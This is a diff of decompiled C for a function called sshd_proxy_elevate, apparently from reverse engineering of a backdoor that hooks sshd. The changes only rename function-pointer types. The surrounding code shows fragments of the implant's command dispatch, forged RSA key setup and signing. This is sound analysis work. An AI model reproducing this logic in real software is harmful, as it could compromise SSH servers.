@@ -28,7 +28,7 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   sshd_ctx_t *psVar6;
   long *plVar7;
   undefined8 *puVar8;
-  _func_56 *p_Var9;
+  pfn_EVP_Digest_t ppVar9;
   BOOL BVar10;
   uint uVar11;
   int iVar12;
@@ -139,10 +139,10 @@ BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)
   if (plVar5 == (libc_imports_t *)0x0) {
     return FALSE;
   }
-  if (plVar5->pselect == (_func_24 *)0x0) {
+  if (plVar5->pselect == (pfn_pselect_t)0x0) {
     return FALSE;
   }
-  if (plVar5->__errno_location == (_func_26 *)0x0) {
+  if (plVar5->__errno_location == (pfn___errno_location_t)0x0) {
     return FALSE;
   }
   psVar6 = ctx->sshd_ctx;
@@ -200,7 +200,7 @@ LAB_0010845f:
     }
     if ((args->cmd_type == 3) && (bVar21 = pcVar13->flags2 & 0xc0, bVar21 != 0xc0)) {
       if (bVar21 == 0x40) {
-        if (plVar5->exit == (_func_19 *)0x0) {
+        if (plVar5->exit == (pfn_exit_t)0x0) {
           return FALSE;
         }
         (*plVar5->exit)(0);
@@ -426,9 +426,9 @@ LAB_0010845f:
           d = (*ctx->imported_funcs->BN_bin2bn)(&local_e81,1,(BIGNUM *)0x0);
           iVar12 = (*ctx->imported_funcs->RSA_set0_key)(r,pBVar18,pBVar17,d);
           if (iVar12 != 1) goto LAB_00108cd2;
-          p_Var9 = ctx->imported_funcs->EVP_Digest;
+          ppVar9 = ctx->imported_funcs->EVP_Digest;
           type = (*ctx->imported_funcs->EVP_sha256)();
-          iVar12 = (*p_Var9)(local_90b,uVar33 + 399,local_e60,(uint *)0x0,type,(ENGINE *)0x0);
+          iVar12 = (*ppVar9)(local_90b,uVar33 + 399,local_e60,(uint *)0x0,type,(ENGINE *)0x0);
           if (iVar12 == 1) {
             iVar12 = (*ctx->imported_funcs->RSA_sign)
                                (0x2a0,local_e60,0x20,(uchar *)local_d40,&local_e7c,r);
@@ -505,7 +505,7 @@ LAB_001088b7:
               if (plVar5 == (libc_imports_t *)0x0) {
                 return FALSE;
               }
-              if (plVar5->exit == (_func_19 *)0x0) {
+              if (plVar5->exit == (pfn_exit_t)0x0) {
                 return FALSE;
               }
               if ((uVar3 == 0) || ((uVar3 == 3 && ((pcVar13->flags3 & 0x20) != 0)))) {
@@ -557,10 +557,10 @@ LAB_0010897e:
               local_d40[0] = CONCAT44(local_d40[0]._4_4_,uVar11);
               uVar33 = (ulong)uVar11;
               if (uVar33 != 0) {
-                if (plVar5->read == (_func_25 *)0x0) {
+                if (plVar5->read == (pfn_read_t)0x0) {
                   return FALSE;
                 }
-                if (plVar5->__errno_location == (_func_26 *)0x0) {
+                if (plVar5->__errno_location == (pfn___errno_location_t)0x0) {
                   return FALSE;
                 }
                 do {
@@ -585,7 +585,7 @@ LAB_0010897e:
               if (uVar3 != 2) {
                 return TRUE;
               }
-              if (plVar5->exit == (_func_19 *)0x0) {
+              if (plVar5->exit == (pfn_exit_t)0x0) {
                 return FALSE;
               }
               (*plVar5->exit)(0);
